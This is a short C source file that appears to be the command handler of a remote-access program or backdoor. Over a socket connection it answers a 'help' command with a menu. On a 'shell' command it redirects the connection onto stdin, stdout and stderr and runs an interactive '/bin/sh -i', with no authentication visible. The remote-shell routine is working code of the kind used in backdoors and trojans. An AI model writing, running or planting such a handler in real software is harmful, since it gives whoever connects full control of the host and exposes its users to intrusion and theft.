#include <string.h>
#include <unistd.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <pty.h>

#include "commands.h"

int retry_send(char *buf, int conn_fd, int size, fd_set* write_fds)
{
	// TODO: add max_retries here
	while (!FD_ISSET(conn_fd, write_fds))
		sleep(1);
	send(conn_fd, buf, size, 0);
	return 0;
}

int start_shell(int conn_fd)
{
	int master_fd;
	// TODO: research this. If i just use fork(), sh will complain
	// about no tty
    int pid = forkpty(&master_fd, NULL, NULL, NULL);

	// child
	if (!pid)
	{
		char *name[3];
		dup2(conn_fd, 0);
		dup2(conn_fd, 1);
		dup2(conn_fd, 2);

		name[0] = "/bin/sh";
		name[1] = "-i";
		name[2] = NULL;
		execv(name[0], name);
		exit(1);
	}
	waitpid(pid, 0, 0);
	return 0;
}

int handle_command(char *input, int conn_fd, fd_set* write_fds)
{
	
	if (!strcmp(input, "help\n"))
	{
		if (retry_send(HELP_MENU, conn_fd, strlen(HELP_MENU), write_fds))
			return 1;
		return retry_send(": ", conn_fd, 2, write_fds);

	}
	if (!strcmp(input, "shell\n"))
	{
		if (start_shell(conn_fd))
			return 1;
	}
	
	return retry_send(": ", conn_fd, 2, write_fds);
}